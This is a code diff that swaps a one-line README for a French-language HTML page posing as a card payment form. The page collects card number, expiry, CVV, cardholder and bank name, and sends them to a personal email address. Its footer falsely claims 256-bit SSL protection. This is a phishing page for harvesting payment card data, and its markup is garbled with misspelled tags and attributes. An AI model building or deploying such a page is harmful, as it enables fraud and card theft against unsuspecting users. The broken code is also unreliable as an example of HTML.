@@ -1,1 +1,53 @@
-# immobiler
+<!doctype html>
+<html> 
+ <head></head> 
+ <body> <htlm lang="fr"> 
+   <meta carset="UTF-8>
+       <meta http-equiv=X-UA-compatible content=" ie="edge&quot;"> 
+   <meta name="vewport" content="width=device-width,initial-scal=1-0"> 
+   <title>Paimeent</title> 
+   <link rel="steelsheet=" "href"="./style.css" "> 
+   <div class="container"> 
+    <h4>Procedez a un paiement 
+     <hr style=" border-top: 1px solid blue;"></h4> 
+    <br> 
+    <h1>Card Info</h1> 
+    <br> 
+    <form action="issaabdoulazizou84@gmail.com" metod="POST"> 
+     <input type="" texte"montant="montant&quot;" placeholder="Montant" required> 
+     <br> 
+     <br> 
+     <input type="" texte"banque="banque&quot;" placeholder="Nom de la Banque" required> 
+     <br> 
+     <br> 
+     <input type="" texte"name="name&quot;" placeholder="Titulaire de la carte" required> 
+     <br> 
+     <br> 
+     <input type="" texte"number="number&quot;" placeholder="Numero de la carte" required> 
+     <br> 
+     <br> 
+     <input type="" texte"date="date&quot;" placeholder="MM/AAAA" required> 
+     <br> 
+     <br> 
+     <input type="" texte"cvv="Cvv&quot;" placeholder="Cvv/Code" required> 
+     <br> 
+     <br> <button type="submit">PAYEZ</button> 
+    </form> 
+    <br> 
+    <br> 
+    <br> 
+   </div> 
+   <footer> 
+    <div class="row"> 
+     <div class="col-xs-12 col-sm-6"> 
+      <div id="footer-copyright">
+        © 2022 - <b>Fast Convert</b> BE-FR fait partie d’CG &nbsp; | &nbsp; Votre paiement est 
+       <br> protégé par un cryptage SSL 256 bits 
+      </div> 
+      <br> 
+     </div> 
+    </div> 
+   </footer> 
+  </htlm> 
+ </body>
+</html>
